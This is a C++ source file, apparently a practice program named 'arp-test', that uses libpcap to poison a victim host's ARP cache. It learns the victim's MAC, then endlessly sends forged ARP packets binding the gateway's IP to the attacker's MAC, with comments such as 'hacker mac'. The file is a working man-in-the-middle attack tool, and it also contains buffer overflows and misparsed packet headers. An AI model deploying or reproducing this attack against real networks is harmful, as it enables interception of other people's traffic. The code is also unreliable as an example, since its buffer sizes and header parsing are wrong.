#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/ether.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <string>
// #include <libnet.h>
#include "_libnet.h"

#pragma pack(push, 1)
struct EthArpPacket final
{
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage()
{
	printf("syntax: arp-test <interface> <victim ip> <gateway ip>\n");
	printf("arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

using namespace std;

char *get_mac_address(void);

int main(int argc, char *argv[])
{
	if (argc != 4)
	{
		usage();
		return -1;
	}

	char *dev = argv[1];
	char *victim_ip = argv[2];
	char *gateway_ip = argv[3];

	char my_mac[100];
	strcpy(my_mac, get_mac_address());

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

	// To get the victim's Mac address
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); // victim mac
	packet.eth_.smac_ = Mac(my_mac);			  // hacker mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac);			  // hacker mac
	packet.arp_.sip_ = htonl(Ip(gateway_ip));	  // gateway ip
	packet.arp_.tmac_ = Mac("FF:FF:FF:FF:FF:FF"); // hacker mac
	packet.arp_.tip_ = htonl(Ip(victim_ip));	  // victim ip

	struct pcap_pkthdr *header;
	const u_char *packet_data;

	struct libnet_ethernet_hdr *ethernet_header;
	// struct ip *iph;
	struct libnet_ipv4_hdr* ip_header;

	char mac[20] = {0, };
	char buf[20];

	while (1)
	{

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
		if (res != 0)
		{
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		res = pcap_next_ex(handle, &header, &packet_data);

		printf("%u bytes captured\n", header->caplen);

		ethernet_header = (struct libnet_ethernet_hdr *)packet_data;

		// printf("\tdstmac: %02x:%02x:%02x:%02x:%02x:%02x\n", ethernet_header->ether_shost[0], ethernet_header->ether_shost[1], ethernet_header->ether_shost[2], ethernet_header->ether_shost[3], ethernet_header->ether_shost[4], ethernet_header->ether_shost[5]);
		for(int i = 0; i < 6; i++){
			// strcat(mac, ethernet_header->ether_shost[i]);
			sprintf(buf, "%02x:", ethernet_header->ether_shost[i]);
			strcat(mac, buf);
		}
		*(mac + 17) = NULL;

		printf("mac = %s\n", mac);

		ip_header = (struct libnet_ipv4_hdr*)(packet_data + sizeof(struct libnet_ethernet_hdr) + 2);
        printf(">>%s\n", inet_ntoa(ip_header->ip_src));
        printf("%s\n", mac);
        if (strcmp(inet_ntoa(ip_header->ip_src), argv[3]) == 0)
        {
            break;
        }
	}

	packet.eth_.dmac_ = Mac(mac); // victim mac
	packet.eth_.smac_ = Mac(my_mac);			  // hacker mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac);			  // hacker mac
	packet.arp_.sip_ = htonl(Ip(gateway_ip));	  // gateway ip
	packet.arp_.tmac_ = Mac(mac); // hacker mac
	packet.arp_.tip_ = htonl(Ip(victim_ip));	  // victim ip

	while(1){
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
		printf("res = %d\n", res);
		// sleep(1);
	}

	pcap_close(handle);
}

char *get_mac_address(void)
{
	int socket_fd;
	int count_if;
	struct ifreq *t_if_req;
	struct ifconf t_if_conf;
	static char arr_mac_addr[17] = {
		0x00,
	};
	memset(&t_if_conf, 0, sizeof(t_if_conf));
	t_if_conf.ifc_ifcu.ifcu_req = NULL;
	t_if_conf.ifc_len = 0;
	if ((socket_fd = socket(PF_INET, SOCK_DGRAM, 0)) < 0)
	{
		return NULL;
	}
	if (ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0)
	{
		return NULL;
	}
	if ((t_if_req = (ifreq *)malloc(t_if_conf.ifc_len)) == NULL)
	{
		close(socket_fd);
		free(t_if_req);
		return NULL;
	}
	else
	{
		t_if_conf.ifc_ifcu.ifcu_req = t_if_req;
		if (ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0)
		{
			close(socket_fd);
			free(t_if_req);
			return NULL;
		}
		count_if = t_if_conf.ifc_len / sizeof(struct ifreq);
		for (int idx = 0; idx < count_if; idx++)
		{
			struct ifreq *req = &t_if_req[idx];
			if (!strcmp(req->ifr_name, "lo"))
			{
				continue;
			}
			if (ioctl(socket_fd, SIOCGIFHWADDR, req) < 0)
			{
				break;
			}
			sprintf(arr_mac_addr, "%02x:%02x:%02x:%02x:%02x:%02x", (unsigned char)req->ifr_hwaddr.sa_data[0], (unsigned char)req->ifr_hwaddr.sa_data[1], (unsigned char)req->ifr_hwaddr.sa_data[2], (unsigned char)req->ifr_hwaddr.sa_data[3], (unsigned char)req->ifr_hwaddr.sa_data[4], (unsigned char)req->ifr_hwaddr.sa_data[5]);
			break;
		}
	}
	close(socket_fd);
	free(t_if_req);
	return arr_mac_addr;
}
